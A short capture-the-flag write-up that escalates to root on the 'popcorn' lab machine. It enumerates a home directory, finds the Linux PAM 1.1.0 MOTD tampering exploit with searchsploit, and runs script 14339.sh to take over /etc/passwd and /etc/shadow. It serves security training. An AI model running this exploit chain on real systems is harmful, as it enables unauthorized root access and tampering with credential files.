## motd
- Looking in george's home directory, see there is a motd file in the .cache directory.
```bash
www-data@popcorn:/home/george$ find . -type f -ls 2>/dev/null
    76    4 -rw-r--r--   1 george   george        220 Mar 17  2017 ./.bash_logout
    82    4 -rw-r--r--   1 george   george       3180 Mar 17  2017 ./.bashrc
 42885  832 -rw-r--r--   1 george   george     848727 Mar 17  2017 ./torrenthoster.zip
 42883    0 -rw-r--r--   1 george   george          0 Mar 17  2017 ./.cache/motd.legal-displayed
 42884    0 -rw-r--r--   1 george   george          0 Mar 17  2017 ./.sudo_as_admin_successful
  2210    4 -rw-r--r--   1 george   george         33 Apr 12 19:27 ./user.txt
 43648    4 -rw-------   1 root     root           19 May  5  2017 ./.nano_history
 44232    4 -rw-------   1 root     root         1571 Mar 17  2017 ./.mysql_history
   107    4 -rw-r--r--   1 george   george        675 Mar 17  2017 ./.profile
```
- Look for CVE's relating to motd, find a privesc CVE that is applicable.
```bash
$ searchsploit motd 
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (1)                          | linux/local/14273.sh
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)                          | linux/local/14339.sh
MultiTheftAuto 0.5 patch 1 - Server Crash / MOTD Deletion                                                   | windows/dos/1235.c
------------------------------------------------------------------------------------------------------------ ---------------------------------
```
- Run the second option (beginning with Linux PAM 1.1.0) on the victim to get root
```bash
www-data@popcorn:/dev/shm$ bash 14339.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: 
root@popcorn:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```
